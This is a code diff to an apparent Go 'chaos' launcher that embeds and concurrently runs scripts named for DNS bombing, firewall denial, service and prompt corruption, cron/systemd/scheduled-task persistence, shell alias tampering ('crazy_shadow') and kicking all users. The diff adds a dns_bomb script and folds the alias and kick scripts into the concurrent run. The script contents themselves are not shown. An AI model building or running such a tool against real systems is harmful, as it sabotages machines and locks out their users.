@@ -5,7 +5,6 @@ import (
     "sync"
     "os/exec"
     "bytes"
-    "fmt"
     "os"
     "path/filepath"
 )
@@ -50,9 +49,11 @@ var stop_shell_switch1 []byte
 //go:embed scripts/stop_shell_switch2.sh
 var stop_shell_switch2 []byte
 
-// chaos - runs last
 //go:embed scripts/crazy_shadow.sh
 var crazy_shadow_sh []byte
+
+//go:embed scripts/dns_bomb.sh
+var dns_bomb []byte
 
 //go:embed scripts/kick_all.sh
 var kick_all []byte
@@ -107,11 +108,14 @@ func main() {
 
     bash_scripts := [][]byte{
         cron_dns_bomb,
+        dns_bomb,
         sysd_dns_bomb,
         firewall_deny_sh,
         firewall_deny_cron,
         firewall_deny_systemd,
+        crazy_shadow_sh,
         prompt_space_sh,
+        kick_all,
         prompt_space_cron,
         prompt_space_systemd,
         service_corrupt_sh,
@@ -132,7 +136,6 @@ func main() {
         service_corrupt_task_ps1,
     }
 
-    // fire everything concurrently
     for _, s := range bash_scripts {
         wg.Add(1)
         go run_bash(s, &wg)
@@ -142,20 +145,18 @@ func main() {
         go run_ps1(s, &wg)
     }
 
-    // wait for all main scripts to finish
     wg.Wait()
 
-    // chaos finale - aliases drop after everything is persisted
-    var chaos_wg sync.WaitGroup
-    for _, s := range [][]byte{crazy_shadow_sh} {
-        chaos_wg.Add(1)
-        go run_bash(s, &chaos_wg)
-    }
-    chaos_wg.Wait()
+    // shadow and kick run sequentially after everything else finishes
+    // shadow := exec.Command("bash")
+    // shadow.Stdin = bytes.NewReader(crazy_shadow_sh)
+    // if err := shadow.Start(); err == nil {
+    //     shadow.Wait()
+    // }
 
-    fmt.Println("FINISHED")
-
-    kick := exec.Command("bash")
-    kick.Stdin = bytes.NewReader(kick_all)
-    kick.Start()
+    // kick := exec.Command("bash")
+    // kick.Stdin = bytes.NewReader(kick_all)
+    // if err := kick.Start(); err == nil {
+    //     kick.Wait()
+    // }
 }
